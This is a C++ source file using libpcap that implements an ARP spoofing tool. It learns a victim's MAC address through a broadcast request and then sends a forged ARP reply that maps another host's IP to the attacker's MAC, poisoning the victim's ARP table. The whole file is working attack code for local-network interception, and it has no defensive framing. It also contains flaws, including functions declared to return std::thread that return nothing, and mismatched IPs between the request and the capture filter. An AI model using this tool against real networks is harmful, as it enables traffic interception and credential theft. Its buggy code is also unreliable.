#include <sys/types.h>
#include <sys/socket.h>
#include <sys/ioctl.h>
#include <net/if.h>
#include <stdio.h>
#include <iostream>
#include <string.h>
#include <stdlib.h>
#include <pcap.h>
#include <thread>
#include "info_network.hpp"
#include "net_header.hpp"
#define HWADDR_len 6
using namespace std;

// info_network
info_network::info_network(char INTERFACE[10], char SENDER_IP[16], char TARGET_IP[16])
{
    strncpy(this->interface, INTERFACE, 9);
    strncpy(this->sender_IP, SENDER_IP, 16);
    strncpy(this->target_IP, TARGET_IP, 16);
    find_mac_addr(this->my_MACaddr, interface);
}

info_network::~info_network(){}

void info_network::find_mac_addr(unsigned char MAC_str[6], char user_interface[10])
{
    int s,i;
    struct ifreq ifr_hw, ifr_ip;
    s = socket(AF_INET, SOCK_DGRAM, 0);
    strcpy(ifr_hw.ifr_name, user_interface);
    strcpy(ifr_ip.ifr_name, user_interface);
    ioctl(s, SIOCGIFHWADDR, &ifr_hw);
    ioctl(s, SIOCGIFADDR, &ifr_ip);
    memcpy(MAC_str, ifr_hw.ifr_hwaddr.sa_data, 6);
    my_IPaddr = ((struct sockaddr_in *)&ifr_ip.ifr_addr)->sin_addr.s_addr;
}

void info_network::print_status()
{
    char ip_addr_tmp[20];
    inet_ntop(AF_INET, (const void *)&my_IPaddr, ip_addr_tmp, sizeof(ip_addr_tmp));
    cout << "\033[1;32m================== Status =================\033[0m" << endl;
    cout << "Interface       : " << interface << endl;
    cout << "my_MAC Address  : ";
    for(int i = 0; i < 6 ; i++)
        printf("%02X",(my_MACaddr[i]));
    cout << endl;
    cout << "my_IP Address   : " << ip_addr_tmp << endl;
    cout << "sender_ip       : " << sender_IP << endl;
    cout << "target_ip       : " << target_IP << endl;
    cout << "target_mac      : ";
    for(int i = 0; i < 6 ; i++)
        printf("%02X",(target_MACaddr[i]));
    cout << endl;
    cout << "\033[1;32m===========================================\033[0m" << endl;
}

// arp_packet
arp_packet::arp_packet(char INTERFACE[10], char SENDER_IP[16], char TARGET_IP[16]):info_network(INTERFACE, SENDER_IP, TARGET_IP)
{
    this->handle = pcap_open_live(this->interface, BUFSIZ, 1, 1000, this->errbuf);
}
arp_packet::~arp_packet()
{
    pcap_close(this->handle);
}

std::thread arp_packet::arp_request()
{
    unsigned char packet[1514];

    cout << "[+] ARP_Request(BroadCast)... then get target's MAC address!" << endl;
    Ethernet_H* eth_h = (Ethernet_H *)packet;
    memcpy(eth_h->dest, "\xff\xff\xff\xff\xff\xff", 6);
    memcpy(eth_h->src, my_MACaddr, 6);
    eth_h->type = ntohs(ETHERTYPE_ARP);

    Arp_H* arp_h = (Arp_H *)(packet+sizeof(Ethernet_H));
    arp_h->h_type = htons(1);
    arp_h->p_type = htons(ETHERTYPE_IP);
    arp_h->h_len = 6;
    arp_h->p_len = 4;
    arp_h->oper = ntohs(ARP_REQUEST);
    memcpy(arp_h->sender_MAC, my_MACaddr, 6);
    *(uint32_t *)arp_h->sender_IP = this->my_IPaddr;
    memcpy(arp_h->target_MAC, "\x00\x00\x00\x00\x00\x00", 6);
    *(uint32_t *)arp_h->target_IP = inet_addr(this->sender_IP);

    pcap_sendpacket(this->handle, packet, sizeof(Ethernet_H)+sizeof(Arp_H));
    cout << "[+] ARP_Request is done." << endl;
}

std::thread arp_packet::arp_capture()
{
    
    struct pcap_pkthdr *header; /* The header that pcap gives us */
    const u_char *packet;       /* The actual packet */
    int res;

    cout << "[+] Capture ARP_REPLY..." << endl;
    /* Grab a packet */
    while(1){
        res = pcap_next_ex(this->handle, &header, &packet);
        if(res == 1){
            Ethernet_H* eth_h = (Ethernet_H *)packet;
            if(ntohs(eth_h->type) == ETHERTYPE_ARP){
                Arp_H* arp_h = (Arp_H *)(packet+sizeof(Ethernet_H));
                if ((ntohs(arp_h->oper) == ARP_REPLY) && (*(uint32_t *)arp_h->sender_IP == inet_addr(this->target_IP))){
                    cout << "[+] Find target_IP's MAC addr : ";
                    for(int i = 0; i < 6; i++)
                        printf("%02X",(arp_h->sender_MAC[i]));
                    cout << endl;
                    memcpy(this->target_MACaddr, arp_h->sender_MAC, 6);
                    break;
                }
            }
            else{
                continue;
            }
        }
    }
}

void arp_packet::arp_reply()
{
    unsigned char packet[1514];

    cout << "[+] ARP_REPLY... Change ARP Table!" << endl;

    Ethernet_H* eth_h = (Ethernet_H *)packet;
    memcpy(eth_h->dest, target_MACaddr, 6);
    memcpy(eth_h->src, my_MACaddr, 6);
    eth_h->type = ntohs(ETHERTYPE_ARP);

    Arp_H* arp_h = (Arp_H *)(packet+sizeof(Ethernet_H));
    arp_h->h_type = htons(1);
    arp_h->p_type = htons(ETHERTYPE_IP);
    arp_h->h_len = 6;
    arp_h->p_len = 4;
    arp_h->oper = ntohs(ARP_REPLY);
    memcpy(arp_h->sender_MAC, this->my_MACaddr, 6);
    memcpy(arp_h->target_MAC, this->target_MACaddr, 6);
    *(uint32_t *)arp_h->sender_IP = inet_addr(this->sender_IP);
    *(uint32_t *)arp_h->target_IP = inet_addr(this->target_IP);

    pcap_sendpacket(this->handle, packet, sizeof(Ethernet_H)+sizeof(Arp_H));
    cout << "[+] ARP_REPLY is done." << endl;
    cout << "\033[1;32m[+] Done! Check it now!\033[0m" << endl;
}
